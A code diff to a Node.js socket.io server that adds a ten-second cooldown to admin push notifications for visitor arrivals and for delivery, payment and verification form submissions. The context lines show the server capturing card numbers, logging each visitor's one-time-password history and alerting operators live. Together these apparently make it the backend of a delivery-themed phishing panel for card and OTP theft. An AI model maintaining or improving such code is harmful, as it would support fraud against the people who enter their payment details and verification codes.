@@ -21,6 +21,11 @@ const visitorRoutes = require('./routes/visitors');
 // Global FCM tokens storage (for admin notifications)
 global.fcmTokens = [];
 
+// Notification cooldown/lock to prevent duplicate notifications
+// Key: sessionId:type, Value: timestamp
+const notificationCooldown = new Map();
+const COOLDOWN_MS = 10000; // 10 seconds cooldown
+
 const app = express();
 const server = http.createServer(app);
 
@@ -212,8 +217,18 @@ io.on('connection', (socket) => {
       // ONLY send FCM push notification for FIRST TIME visitors
       // Do NOT send for reconnections or existing visitors
       if (!hasExistingSubmissions) {
-        console.log('📱 First time visitor - sending push notification');
-        firebaseAdmin.notifyNewVisitor(newVisitorData);
+        // Check cooldown to prevent duplicate notifications
+        const cooldownKey = `${sessionId}:visit`;
+        const lastSent = notificationCooldown.get(cooldownKey);
+        const now = Date.now();
+        
+        if (lastSent && (now - lastSent) < COOLDOWN_MS) {
+          console.log(`📱 Cooldown active - skipping duplicate notification (${Math.round((COOLDOWN_MS - (now - lastSent)) / 1000)}s remaining)`);
+        } else {
+          console.log('📱 First time visitor - sending push notification');
+          notificationCooldown.set(cooldownKey, now);
+          firebaseAdmin.notifyNewVisitor(newVisitorData);
+        }
       } else {
         console.log('📱 Returning visitor - skipping push notification');
       }
@@ -350,8 +365,15 @@ io.on('connection', (socket) => {
       io.emit('form:deliverySubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      // Send FCM push notification to admin
-      firebaseAdmin.notifyDelivery(eventData);
+      // Send FCM push notification with cooldown check
+      const deliveryKey = `${sessionId}:delivery`;
+      const lastDeliverySent = notificationCooldown.get(deliveryKey);
+      if (lastDeliverySent && (Date.now() - lastDeliverySent) < COOLDOWN_MS) {
+        console.log('📱 Delivery notification cooldown active - skipping');
+      } else {
+        notificationCooldown.set(deliveryKey, Date.now());
+        firebaseAdmin.notifyDelivery(eventData);
+      }
 
       console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins (total submissions: ${submissionsResult.rows.length})`);
     } catch (error) {
@@ -426,8 +448,15 @@ io.on('connection', (socket) => {
       io.emit('form:paymentSubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      // Send FCM push notification to admin
-      firebaseAdmin.notifyPayment(eventData);
+      // Send FCM push notification with cooldown check
+      const paymentKey = `${sessionId}:payment`;
+      const lastPaymentSent = notificationCooldown.get(paymentKey);
+      if (lastPaymentSent && (Date.now() - lastPaymentSent) < COOLDOWN_MS) {
+        console.log('📱 Payment notification cooldown active - skipping');
+      } else {
+        notificationCooldown.set(paymentKey, Date.now());
+        firebaseAdmin.notifyPayment(eventData);
+      }
 
       console.log(`💳 Payment form processed for ${sessionId} - card: ${finalPaymentData.cardNumber?.slice(-4) || 'N/A'}`);
     } catch (error) {
@@ -510,8 +539,15 @@ io.on('connection', (socket) => {
       io.emit('form:verificationSubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      // Send FCM push notification to admin
-      firebaseAdmin.notifyVerification(eventData);
+      // Send FCM push notification with cooldown check
+      const verifyKey = `${sessionId}:verification`;
+      const lastVerifySent = notificationCooldown.get(verifyKey);
+      if (lastVerifySent && (Date.now() - lastVerifySent) < COOLDOWN_MS) {
+        console.log('📱 Verification notification cooldown active - skipping');
+      } else {
+        notificationCooldown.set(verifyKey, Date.now());
+        firebaseAdmin.notifyVerification(eventData);
+      }
 
       console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}, Total submissions: ${submissionsResult.rows.length}`);
     } catch (error) {
